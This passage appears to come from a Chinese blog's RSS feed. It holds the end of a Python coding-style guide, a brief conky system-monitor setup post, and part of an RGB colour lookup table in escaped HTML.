2.变量也用小写加下划线的方式，即this_is_a_variable=1
3.常量命名使用全部大写的方式，可以使用下划线。

#包和模块
1.包命名尽量短小，使用全部小写的方式，不可以使用下划线。
2.模块名尽量短小，应该用小写加下划线的方式(如lower_with_under.py).
3.用单下划线(_)开头表示模块变量或函数是protected的(使用import * from时不会包含).

1.尽量单独使用小写字母&amp;#39;l&amp;#39;，大写字母&amp;#39;O&amp;#39;等容易混淆的字母。
&lt;/code>&lt;/pre>&lt;h3 id="0x06-main">0x06 Main&lt;/h3>
&lt;pre tabindex="0">&lt;code>即使是一个打算被用作脚本的文件, 也应该是可导入的. 
并且简单的导入不应该导致这个脚本的主功能(main functionality)被执行
代码应该在执行主程序前总是检查 if __name__ == &amp;#39;__main__&amp;#39;
 def main():
 ...

 if __name__ == &amp;#39;__main__&amp;#39;:
 main()
&lt;/code>&lt;/pre>&lt;h3 id="0x07-字符串">0x07 字符串&lt;/h3>
&lt;pre tabindex="0">&lt;code>避免在循环中用+和+=来累加字符串，可以将每个子串加入列表，然后再循环结束后使用.join连接列表
 items = [&amp;#39;&amp;lt;table&amp;gt;&amp;#39;]
 for last_name, first_name in employee_list:
 items.append(&amp;#39;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;%s, %s&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;#39; % (last_name, first_name))
 items.append(&amp;#39;&amp;lt;/table&amp;gt;&amp;#39;)
 employee_table = &amp;#39;&amp;#39;.join(items)
同一文件中保持使用字符串引号的一致性
多行字符串使用三重&amp;#34;双&amp;#34;引号，不过通常使用括号隐式连接
&lt;/code>&lt;/pre>&lt;h3 id="0x08-其他">0x08 其他&lt;/h3>
&lt;pre tabindex="0">&lt;code>括号：宁缺毋滥的使用括号
类：若一个类不继承自其它类，就显式的从object继承,即使是嵌套类
语句：通常每个语句独占一行，try/except一定不放在一行
文件和sockets：在文件和sockets结束时，显式的关闭它，推荐with语句管理文件
&lt;/code>&lt;/pre></description></item><item><title>conky 配置</title><link>https://wyb0.cn/posts/2016/conky-configuration/</link><pubDate>Sat, 04 Jun 2016 20:26:21 +0000</pubDate><guid>https://wyb0.cn/posts/2016/conky-configuration/</guid><description>&lt;h3 id="0x00-效果">0x00 效果&lt;/h3>
&lt;p>使用软件conky可以在linux上看到系统的运行状态，效果如下：
&lt;img src="https://wyb0.cn/img/post/Conky.png" alt="conky效果图">&lt;/p>
&lt;h3 id="0x01-安装与配置">0x01 安装与配置&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>先安装conky：&lt;br>
sudo apt-get install conky&lt;/p>
&lt;/li>
&lt;li>
&lt;p>在/home/username/下创建文件.conkyrc&lt;/p></description></item><item><title>RGB 颜色对照表</title><link>https://wyb0.cn/posts/2016/rgb-color-look-up-table/</link><pubDate>Sat, 04 Jun 2016 20:03:10 +0000</pubDate><guid>https://wyb0.cn/posts/2016/rgb-color-look-up-table/</guid><description>&lt;html>
&lt;head>
 &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 &lt;title>RGB&lt;/title>
&lt;/head>
&lt;body>
 &lt;p align="center">&lt;b> RGB&lt;/b>颜色对照表&lt;/p>
 &lt;div align="center">
 &lt;center>
 &lt;table width="550" cellspacing="3" border="1">
 &lt;tbody>
 &lt;tr>
 &lt;td bgcolor="#ffffff" height="30" width="30">&lt;/td>
 &lt;td>#FFFFFF&lt;/td>
 &lt;td bgcolor="#fffff0" height="30" width="30">&lt;/td>
 &lt;td>#FFFFF0&lt;/td>
 &lt;td bgcolor="#ffffe0" height="30" width="30">&lt;/td>
 &lt;td>#FFFFE0&lt;/td>
 &lt;td bgcolor="#ffff00" height="30" width="30">&lt;/td>
 &lt;td>#FFFF00&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#fffafa" height="30" width="30">&lt;/td>
 &lt;td>#FFFAFA&lt;/td>
 &lt;td bgcolor="#fffaf0" height="30" width="30">&lt;/td>
 &lt;td>#FFFAF0&lt;/td>
 &lt;td bgcolor="#fffacd" height="30" width="30">&lt;/td>
 &lt;td>#FFFACD&lt;/td>
 &lt;td bgcolor="#fff8dc" height="30" width="30">&lt;/td>
 &lt;td>#FFF8DC&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#fff68f" height="30" width="30">&lt;/td>
 &lt;td>#FFF68F&lt;/td>
 &lt;td bgcolor="#fff5ee" height="30" width="30">&lt;/td>
 &lt;td>#FFF5EE&lt;/td>
 &lt;td bgcolor="#fff0f5" height="30" width="30">&lt;/td>
 &lt;td>#FFF0F5&lt;/td>
 &lt;td bgcolor="#ffefdb" height="30" width="30">&lt;/td>
 &lt;td>#FFEFDB&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#ffefd5" height="30" width="30">&lt;/td>
 &lt;td>#FFEFD5&lt;/td>
 &lt;td bgcolor="#ffec8b" height="30" width="30">&lt;/td>
 &lt;td>#FFEC8B&lt;/td>
 &lt;td bgcolor="#ffebcd" height="30" width="30">&lt;/td>
 &lt;td>#FFEBCD&lt;/td>
 &lt;td bgcolor="#ffe7ba" height="30" width="30">&lt;/td>
 &lt;td>#FFE7BA&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#ffe4e1" height="30" width="30">&lt;/td>
 &lt;td>#FFE4E1&lt;/td>
 &lt;td bgcolor="#ffe4c4" height="30" width="30">&lt;/td>
 &lt;td>#FFE4C4&lt;/td>
 &lt;td bgcolor="#ffe4b5" height="30" width="30">&lt;/td>
 &lt;td>#FFE4B5&lt;/td>
 &lt;td bgcolor="#ffe1ff" height="30" width="30">&lt;/td>
 &lt;td>#FFE1FF&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#ffdead" height="30" width="30">&lt;/td>
 &lt;td>#FFDEAD&lt;/td>
 &lt;td bgcolor="#ffdab9" height="30" width="30">&lt;/td>
 &lt;td>#FFDAB9&lt;/td>
 &lt;td bgcolor="#ffd700" height="30" width="30">&lt;/td>
 &lt;td>#FFD700&lt;/td>
 &lt;td bgcolor="#ffd39b" height="30" width="30">&lt;/td>
 &lt;td>#FFD39B&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#ffc1c1" height="30" width="30">&lt;/td>
 &lt;td>#FFC1C1&lt;/td>
 &lt;td bgcolor="#ffc125" height="30" width="30">&lt;/td>
 &lt;td>#FFC125&lt;/td>
 &lt;td bgcolor="#ffc0cb" height="30" width="30">&lt;/td>
 &lt;td>#FFC0CB&lt;/td>
 &lt;td bgcolor="#ffbbff" height="30" width="30">&lt;/td>
 &lt;td>#FFBBFF&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#ffb90f" height="30" width="30">&lt;/td>
 &lt;td>#FFB90F&lt;/td>
 &lt;td bgcolor="#ffb6c1" height="30" width="30">&lt;/td>
 &lt;td>#FFB6C1&lt;/td>
 &lt;td bgcolor="#ffb5c5" height="30" width="30">&lt;/td>
 &lt;td>#FFB5C5&lt;/td>
 &lt;td bgcolor="#ffaeb9" height="30" width="30">&lt;/td>
 &lt;td>#FFAEB9&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#ffa54f" height="30" width="30">&lt;/td>
 &lt;td>#FFA54F&lt;/td>
 &lt;td bgcolor="#ffa500" height="30" width="30">&lt;/td>
 &lt;td>#FFA500&lt;/td>
 &lt;td bgcolor="#ffa07a" height="30" width="30">&lt;/td>
 &lt;td>#FFA07A&lt;/td>
 &lt;td bgcolor="#ff8c69" height="30" width="30">&lt;/td>
 &lt;td>#FF8C69&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#ff8c00" height="30" width="30">&lt;/td>
 &lt;td>#FF8C00&lt;/td>
 &lt;td bgcolor="#ff83fa" height="30" width="30">&lt;/td>
 &lt;td>#FF83FA&lt;/td>
 &lt;td bgcolor="#ff82ab" height="30" width="30">&lt;/td>
 &lt;td>#FF82AB&lt;/td>
 &lt;td bgcolor="#ff8247" height="30" width="30">&lt;/td>
 &lt;td>#FF8247&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#ff7f50" height="30" width="30">&lt;/td>
 &lt;td>#FF7F50&lt;/td>
 &lt;td bgcolor="#ff7f24" height="30" width="30">&lt;/td>
 &lt;td>#FF7F24&lt;/td>
 &lt;td bgcolor="#ff7f00" height="30" width="30">&lt;/td>
 &lt;td>#FF7F00&lt;/td>
 &lt;td bgcolor="#ff7256" height="30" width="30">&lt;/td>
 &lt;td>#FF7256&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#ff6eb4" height="30" width="30">&lt;/td>
 &lt;td>#FF6EB4&lt;/td>
 &lt;td bgcolor="#ff6a6a" height="30" width="30">&lt;/td>
 &lt;td>#FF6A6A&lt;/td>
 &lt;td bgcolor="#ff69b4" height="30" width="30">&lt;/td>
 &lt;td>#FF69B4&lt;/td>
 &lt;td bgcolor="#ff6347" height="30" width="30">&lt;/td>
 &lt;td>#FF6347&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#ff4500" height="30" width="30">&lt;/td>
 &lt;td>#FF4500&lt;/td>
 &lt;td bgcolor="#ff4040" height="30" width="30">&lt;/td>
 &lt;td>#FF4040&lt;/td>
 &lt;td bgcolor="#ff3e96" height="30" width="30">&lt;/td>
 &lt;td>#FF3E96&lt;/td>
 &lt;td bgcolor="#ff34b3" height="30" width="30">&lt;/td>
 &lt;td>#FF34B3&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#ff3030" height="30" width="30">&lt;/td>
 &lt;td>#FF3030&lt;/td>
 &lt;td bgcolor="#ff1493" height="30" width="30">&lt;/td>
 &lt;td>#FF1493&lt;/td>
 &lt;td bgcolor="#ff00ff" height="30" width="30">&lt;/td>
 &lt;td>#FF00FF&lt;/td>
 &lt;td bgcolor="#ff0000" height="30" width="30">&lt;/td>
 &lt;td>#FF0000&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#fdf5e6" height="30" width="30">&lt;/td>
 &lt;td>#FDF5E6&lt;/td>
 &lt;td bgcolor="#fcfcfc" height="30" width="30">&lt;/td>
 &lt;td>#FCFCFC&lt;/td>
 &lt;td bgcolor="#fafafa" height="30" width="30">&lt;/td>
 &lt;td>#FAFAFA&lt;/td>
 &lt;td bgcolor="#fafad2" height="30" width="30">&lt;/td>
 &lt;td>#FAFAD2&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#faf0e6" height="30" width="30">&lt;/td>
 &lt;td>#FAF0E6&lt;/td>
 &lt;td bgcolor="#faebd7" height="30" width="30">&lt;/td>
 &lt;td>#FAEBD7&lt;/td>
 &lt;td bgcolor="#fa8072" height="30" width="30">&lt;/td>
 &lt;td>#FA8072&lt;/td>
 &lt;td bgcolor="#f8f8ff" height="30" width="30">&lt;/td>
 &lt;td>#F8F8FF&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#f7f7f7" height="30" width="30">&lt;/td>
 &lt;td>#F7F7F7&lt;/td>
 &lt;td bgcolor="#f5fffa" height="30" width="30">&lt;/td>
 &lt;td>#F5FFFA&lt;/td>
 &lt;td bgcolor="#f5f5f5" height="30" width="30">&lt;/td>
 &lt;td>#F5F5F5&lt;/td>
 &lt;td bgcolor="#f5f5dc" height="30" width="30">&lt;/td>
 &lt;td>#F5F5DC&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#f5deb3" height="30" width="30">&lt;/td>
 &lt;td>#F5DEB3&lt;/td>
 &lt;td bgcolor="#f4f4f4" height="30" width="30">&lt;/td>
 &lt;td>#F4F4F4&lt;/td>
 &lt;td bgcolor="#f4a460" height="30" width="30">&lt;/td>
 &lt;td>#F4A460&lt;/td>
 &lt;td bgcolor="#f2f2f2" height="30" width="30">&lt;/td>
 &lt;td>#F2F2F2&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#f0ffff" height="30" width="30">&lt;/td>
 &lt;td>#F0FFFF&lt;/td>
 &lt;td bgcolor="#f0fff0" height="30" width="30">&lt;/td>
 &lt;td>#F0FFF0&lt;/td>
 &lt;td bgcolor="#f0f8ff" height="30" width="30">&lt;/td>
 &lt;td>#F0F8FF&lt;/td>
 &lt;td bgcolor="#f0f0f0" height="30" width="30">&lt;/td>
 &lt;td>#F0F0F0&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#f0e68c" height="30" width="30">&lt;/td>
 &lt;td>#F0E68C&lt;/td>
 &lt;td bgcolor="#f08080" height="30" width="30">&lt;/td>
 &lt;td>#F08080&lt;/td>
 &lt;td bgcolor="#eeeee0" height="30" width="30">&lt;/td>
 &lt;td>#EEEEE0&lt;/td>
 &lt;td bgcolor="#eeeed1" height="30" width="30">&lt;/td>
 &lt;td>#EEEED1&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#eeee00" height="30" width="30">&lt;/td>
 &lt;td>#EEEE00&lt;/td>
 &lt;td bgcolor="#eee9e9" height="30" width="30">&lt;/td>
 &lt;td>#EEE9E9&lt;/td>
 &lt;td bgcolor="#eee9bf" height="30" width="30">&lt;/td>
 &lt;td>#EEE9BF&lt;/td>
 &lt;td bgcolor="#eee8cd" height="30" width="30">&lt;/td>
 &lt;td>#EEE8CD&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#eee8aa" height="30" width="30">&lt;/td>
 &lt;td>#EEE8AA&lt;/td>
 &lt;td bgcolor="#eee685" height="30" width="30">&lt;/td>
 &lt;td>#EEE685&lt;/td>
 &lt;td bgcolor="#eee5de" height="30" width="30">&lt;/td>
 &lt;td>#EEE5DE&lt;/td>
 &lt;td bgcolor="#eee0e5" height="30" width="30">&lt;/td>
 &lt;td>#EEE0E5&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#eedfcc" height="30" width="30">&lt;/td>
 &lt;td>#EEDFCC&lt;/td>
 &lt;td bgcolor="#eedc82" height="30" width="30">&lt;/td>
 &lt;td>#EEDC82&lt;/td>
 &lt;td bgcolor="#eed8ae" height="30" width="30">&lt;/td>
 &lt;td>#EED8AE&lt;/td>
 &lt;td bgcolor="#eed5d2" height="30" width="30">&lt;/td>
 &lt;td>#EED5D2&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#eed5b7" height="30" width="30">&lt;/td>
 &lt;td>#EED5B7&lt;/td>
 &lt;td bgcolor="#eed2ee" height="30" width="30">&lt;/td>
 &lt;td>#EED2EE&lt;/td>
 &lt;td bgcolor="#eecfa1" height="30" width="30">&lt;/td>
 &lt;td>#EECFA1&lt;/td>
 &lt;td bgcolor="#eecbad" height="30" width="30">&lt;/td>
 &lt;td>#EECBAD&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#eec900" height="30" width="30">&lt;/td>
 &lt;td>#EEC900&lt;/td>
 &lt;td bgcolor="#eec591" height="30" width="30">&lt;/td>
 &lt;td>#EEC591&lt;/td>
 &lt;td bgcolor="#eeb4b4" height="30" width="30">&lt;/td>
 &lt;td>#EEB4B4&lt;/td>
 &lt;td bgcolor="#eeb422" height="30" width="30">&lt;/td>
 &lt;td>#EEB422&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#eeaeee" height="30" width="30">&lt;/td>
 &lt;td>#EEAEEE&lt;/td>
 &lt;td bgcolor="#eead0e" height="30" width="30">&lt;/td>
 &lt;td>#EEAD0E&lt;/td>
 &lt;td bgcolor="#eea9b8" height="30" width="30">&lt;/td>
 &lt;td>#EEA9B8&lt;/td>
 &lt;td bgcolor="#eea2ad" height="30" width="30">&lt;/td>
 &lt;td>#EEA2AD&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#ee9a49" height="30" width="30">&lt;/td>
 &lt;td>#EE9A49&lt;/td>
 &lt;td bgcolor="#ee9a00" height="30" width="30">&lt;/td>
 &lt;td>#EE9A00&lt;/td>
 &lt;td bgcolor="#ee9572" height="30" width="30">&lt;/td>
 &lt;td>#EE9572&lt;/td>
 &lt;td bgcolor="#ee82ee" height="30" width="30">&lt;/td>
 &lt;td>#EE82EE&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#ee8262" height="30" width="30">&lt;/td>
 &lt;td>#EE8262&lt;/td>
 &lt;td bgcolor="#ee7ae9" height="30" width="30">&lt;/td>
 &lt;td>#EE7AE9&lt;/td>
 &lt;td bgcolor="#ee799f" height="30" width="30">&lt;/td>
 &lt;td>#EE799F&lt;/td>
 &lt;td bgcolor="#ee7942" height="30" width="30">&lt;/td>
 &lt;td>#EE7942&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#ee7621" height="30" width="30">&lt;/td>
 &lt;td>#EE7621&lt;/td>
 &lt;td bgcolor="#ee7600" height="30" width="30">&lt;/td>
 &lt;td>#EE7600&lt;/td>
 &lt;td bgcolor="#ee6aa7" height="30" width="30">&lt;/td>
 &lt;td>#EE6AA7&lt;/td>
 &lt;td bgcolor="#ee6a50" height="30" width="30">&lt;/td>
 &lt;td>#EE6A50&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#ee6363" height="30" width="30">&lt;/td>
 &lt;td>#EE6363&lt;/td>
 &lt;td bgcolor="#ee5c42" height="30" width="30">&lt;/td>
 &lt;td>#EE5C42&lt;/td>
 &lt;td bgcolor="#ee4000" height="30" width="30">&lt;/td>
 &lt;td>#EE4000&lt;/td>
 &lt;td bgcolor="#ee3b3b" height="30" width="30">&lt;/td>
 &lt;td>#EE3B3B&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#ee3a8c" height="30" width="30">&lt;/td>
 &lt;td>#EE3A8C&lt;/td>
 &lt;td bgcolor="#ee30a7" height="30" width="30">&lt;/td>
 &lt;td>#EE30A7&lt;/td>
 &lt;td bgcolor="#ee2c2c" height="30" width="30">&lt;/td>
 &lt;td>#EE2C2C&lt;/td>
 &lt;td bgcolor="#ee1289" height="30" width="30">&lt;/td>
 &lt;td>#EE1289&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#ee00ee" height="30" width="30">&lt;/td>
 &lt;td>#EE00EE&lt;/td>
 &lt;td bgcolor="#ee0000" height="30" width="30">&lt;/td>
 &lt;td>#EE0000&lt;/td>
 &lt;td bgcolor="#ededed" height="30" width="30">&lt;/td>
 &lt;td>#EDEDED&lt;/td>
 &lt;td bgcolor="#ebebeb" height="30" width="30">&lt;/td>
 &lt;td>#EBEBEB&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#eaeaea" height="30" width="30">&lt;/td>
 &lt;td>#EAEAEA&lt;/td>
 &lt;td bgcolor="#e9967a" height="30" width="30">&lt;/td>
 &lt;td>#E9967A&lt;/td>
 &lt;td bgcolor="#e8e8e8" height="30" width="30">&lt;/td>
 &lt;td>#E8E8E8&lt;/td>
 &lt;td bgcolor="#e6e6fa" height="30" width="30">&lt;/td>
 &lt;td>#E6E6FA&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#e5e5e5" height="30" width="30">&lt;/td>
 &lt;td>#E5E5E5&lt;/td>
 &lt;td bgcolor="#e3e3e3" height="30" width="30">&lt;/td>
 &lt;td>#E3E3E3&lt;/td>
 &lt;td bgcolor="#e0ffff" height="30" width="30">&lt;/td>
 &lt;td>#E0FFFF&lt;/td>
 &lt;td bgcolor="#e0eeee" height="30" width="30">&lt;/td>
 &lt;td>#E0EEEE&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#e0eee0" height="30" width="30">&lt;/td>
 &lt;td>#E0EEE0&lt;/td>
 &lt;td bgcolor="#e0e0e0" height="30" width="30">&lt;/td>
 &lt;td>#E0E0E0&lt;/td>
 &lt;td bgcolor="#e066ff" height="30" width="30">&lt;/td>
 &lt;td>#E066FF&lt;/td>
 &lt;td bgcolor="#dedede" height="30" width="30">&lt;/td>
 &lt;td>#DEDEDE&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#deb887" height="30" width="30">&lt;/td>
 &lt;td>#DEB887&lt;/td>
 &lt;td bgcolor="#dda0dd" height="30" width="30">&lt;/td>
 &lt;td>#DDA0DD&lt;/td>
 &lt;td bgcolor="#dcdcdc" height="30" width="30">&lt;/td>
 &lt;td>#DCDCDC&lt;/td>
 &lt;td bgcolor="#dc143c" height="30" width="30">&lt;/td>
 &lt;td>#DC143C&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#dbdbdb" height="30" width="30">&lt;/td>
 &lt;td>#DBDBDB&lt;/td>
 &lt;td bgcolor="#db7093" height="30" width="30">&lt;/td>
 &lt;td>#DB7093&lt;/td>
 &lt;td bgcolor="#daa520" height="30" width="30">&lt;/td>
 &lt;td>#DAA520&lt;/td>
 &lt;td bgcolor="#da70d6" height="30" width="30">&lt;/td>
 &lt;td>#DA70D6&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#d9d9d9" height="30" width="30">&lt;/td>
 &lt;td>#D9D9D9&lt;/td>
 &lt;td bgcolor="#d8bfd8" height="30" width="30">&lt;/td>
 &lt;td>#D8BFD8&lt;/td>
 &lt;td bgcolor="#d6d6d6" height="30" width="30">&lt;/td>
 &lt;td>#D6D6D6&lt;/td>
 &lt;td bgcolor="#d4d4d4" height="30" width="30">&lt;/td>
 &lt;td>#D4D4D4&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#d3d3d3" height="30" width="30">&lt;/td>
 &lt;td>#D3D3D3&lt;/td>
 &lt;td bgcolor="#d2b48c" height="30" width="30">&lt;/td>
 &lt;td>#D2B48C&lt;/td>
 &lt;td bgcolor="#d2691e" height="30" width="30">&lt;/td>
 &lt;td>#D2691E&lt;/td>
 &lt;td bgcolor="#d1eeee" height="30" width="30">&lt;/td>
 &lt;td>#D1EEEE&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#d1d1d1" height="30" width="30">&lt;/td>
 &lt;td>#D1D1D1&lt;/td>
 &lt;td bgcolor="#d15fee" height="30" width="30">&lt;/td>
 &lt;td>#D15FEE&lt;/td>
 &lt;td bgcolor="#d02090" height="30" width="30">&lt;/td>
 &lt;td>#D02090&lt;/td>
 &lt;td bgcolor="#cfcfcf" height="30" width="30">&lt;/td>
 &lt;td>#CFCFCF&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#cdcdc1" height="30" width="30">&lt;/td>
 &lt;td>#CDCDC1&lt;/td>
 &lt;td bgcolor="#cdcdb4" height="30" width="30">&lt;/td>
 &lt;td>#CDCDB4&lt;/td>
 &lt;td bgcolor="#cdcd00" height="30" width="30">&lt;/td>
 &lt;td>#CDCD00&lt;/td>
 &lt;td bgcolor="#cdc9c9" height="30" width="30">&lt;/td>
 &lt;td>#CDC9C9&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#cdc9a5" height="30" width="30">&lt;/td>
 &lt;td>#CDC9A5&lt;/td>
 &lt;td bgcolor="#cdc8b1" height="30" width="30">&lt;/td>
 &lt;td>#CDC8B1&lt;/td>
 &lt;td bgcolor="#cdc673" height="30" width="30">&lt;/td>
 &lt;td>#CDC673&lt;/td>
 &lt;td bgcolor="#cdc5bf" height="30" width="30">&lt;/td>
 &lt;td>#CDC5BF&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#cdc1c5" height="30" width="30">&lt;/td>
 &lt;td>#CDC1C5&lt;/td>
 &lt;td bgcolor="#cdc0b0" height="30" width="30">&lt;/td>
 &lt;td>#CDC0B0&lt;/td>
 &lt;td bgcolor="#cdbe70" height="30" width="30">&lt;/td>
 &lt;td>#CDBE70&lt;/td>
 &lt;td bgcolor="#cdba96" height="30" width="30">&lt;/td>
 &lt;td>#CDBA96&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#cdb7b5" height="30" width="30">&lt;/td>
 &lt;td>#CDB7B5&lt;/td>
 &lt;td bgcolor="#cdb79e" height="30" width="30">&lt;/td>
 &lt;td>#CDB79E&lt;/td>
 &lt;td bgcolor="#cdb5cd" height="30" width="30">&lt;/td>
 &lt;td>#CDB5CD&lt;/td>
 &lt;td bgcolor="#cdb38b" height="30" width="30">&lt;/td>
 &lt;td>#CDB38B&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#cdaf95" height="30" width="30">&lt;/td>
 &lt;td>#CDAF95&lt;/td>
 &lt;td bgcolor="#cdad00" height="30" width="30">&lt;/td>
 &lt;td>#CDAD00&lt;/td>
 &lt;td bgcolor="#cdaa7d" height="30" width="30">&lt;/td>
 &lt;td>#CDAA7D&lt;/td>
 &lt;td bgcolor="#cd9b9b" height="30" width="30">&lt;/td>
 &lt;td>#CD9B9B&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#cd9b1d" height="30" width="30">&lt;/td>
 &lt;td>#CD9B1D&lt;/td>
 &lt;td bgcolor="#cd96cd" height="30" width="30">&lt;/td>
 &lt;td>#CD96CD&lt;/td>
 &lt;td bgcolor="#cd950c" height="30" width="30">&lt;/td>
 &lt;td>#CD950C&lt;/td>
 &lt;td bgcolor="#cd919e" height="30" width="30">&lt;/td>
 &lt;td>#CD919E&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#cd8c95" height="30" width="30">&lt;/td>
 &lt;td>#CD8C95&lt;/td>
 &lt;td bgcolor="#cd853f" height="30" width="30">&lt;/td>
 &lt;td>#CD853F&lt;/td>
 &lt;td bgcolor="#cd8500" height="30" width="30">&lt;/td>
 &lt;td>#CD8500&lt;/td>
 &lt;td bgcolor="#cd8162" height="30" width="30">&lt;/td>
 &lt;td>#CD8162&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#cd7054" height="30" width="30">&lt;/td>
 &lt;td>#CD7054&lt;/td>
 &lt;td bgcolor="#cd69c9" height="30" width="30">&lt;/td>
 &lt;td>#CD69C9&lt;/td>
 &lt;td bgcolor="#cd6889" height="30" width="30">&lt;/td>
 &lt;td>#CD6889&lt;/td>
 &lt;td bgcolor="#cd6839" height="30" width="30">&lt;/td>
 &lt;td>#CD6839&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#cd661d" height="30" width="30">&lt;/td>
 &lt;td>#CD661D&lt;/td>
 &lt;td bgcolor="#cd6600" height="30" width="30">&lt;/td>
 &lt;td>#CD6600&lt;/td>
 &lt;td bgcolor="#cd6090" height="30" width="30">&lt;/td>
 &lt;td>#CD6090&lt;/td>
 &lt;td bgcolor="#cd5c5c" height="30" width="30">&lt;/td>
 &lt;td>#CD5C5C&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#cd5b45" height="30" width="30">&lt;/td>
 &lt;td>#CD5B45&lt;/td>
 &lt;td bgcolor="#cd5555" height="30" width="30">&lt;/td>
 &lt;td>#CD5555&lt;/td>
 &lt;td bgcolor="#cd4f39" height="30" width="30">&lt;/td>
 &lt;td>#CD4F39&lt;/td>
 &lt;td bgcolor="#cd3700" height="30" width="30">&lt;/td>
 &lt;td>#CD3700&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#cd3333" height="30" width="30">&lt;/td>
 &lt;td>#CD3333&lt;/td>
 &lt;td bgcolor="#cd3278" height="30" width="30">&lt;/td>
 &lt;td>#CD3278&lt;/td>
 &lt;td bgcolor="#cd2990" height="30" width="30">&lt;/td>
 &lt;td>#CD2990&lt;/td>
 &lt;td bgcolor="#cd2626" height="30" width="30">&lt;/td>
 &lt;td>#CD2626&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#cd1076" height="30" width="30">&lt;/td>
 &lt;td>#CD1076&lt;/td>
 &lt;td bgcolor="#cd00cd" height="30" width="30">&lt;/td>
 &lt;td>#CD00CD&lt;/td>
 &lt;td bgcolor="#cd0000" height="30" width="30">&lt;/td>
 &lt;td>#CD0000&lt;/td>
 &lt;td bgcolor="#cccccc" height="30" width="30">&lt;/td>
 &lt;td>#CCCCCC&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#caff70" height="30" width="30">&lt;/td>
 &lt;td>#CAFF70&lt;/td>
 &lt;td bgcolor="#cae1ff" height="30" width="30">&lt;/td>
 &lt;td>#CAE1FF&lt;/td>
 &lt;td bgcolor="#c9c9c9" height="30" width="30">&lt;/td>
 &lt;td>#C9C9C9&lt;/td>
 &lt;td bgcolor="#c7c7c7" height="30" width="30">&lt;/td>
 &lt;td>#C7C7C7&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#c71585" height="30" width="30">&lt;/td>
 &lt;td>#C71585&lt;/td>
 &lt;td bgcolor="#c6e2ff" height="30" width="30">&lt;/td>
 &lt;td>#C6E2FF&lt;/td>
 &lt;td bgcolor="#c67171" height="30" width="30">&lt;/td>
 &lt;td>#C67171&lt;/td>
 &lt;td bgcolor="#c5c1aa" height="30" width="30">&lt;/td>
 &lt;td>#C5C1AA&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#c4c4c4" height="30" width="30">&lt;/td>
 &lt;td>#C4C4C4&lt;/td>
 &lt;td bgcolor="#c2c2c2" height="30" width="30">&lt;/td>
 &lt;td>#C2C2C2&lt;/td>
 &lt;td bgcolor="#c1ffc1" height="30" width="30">&lt;/td>
 &lt;td>#C1FFC1&lt;/td>
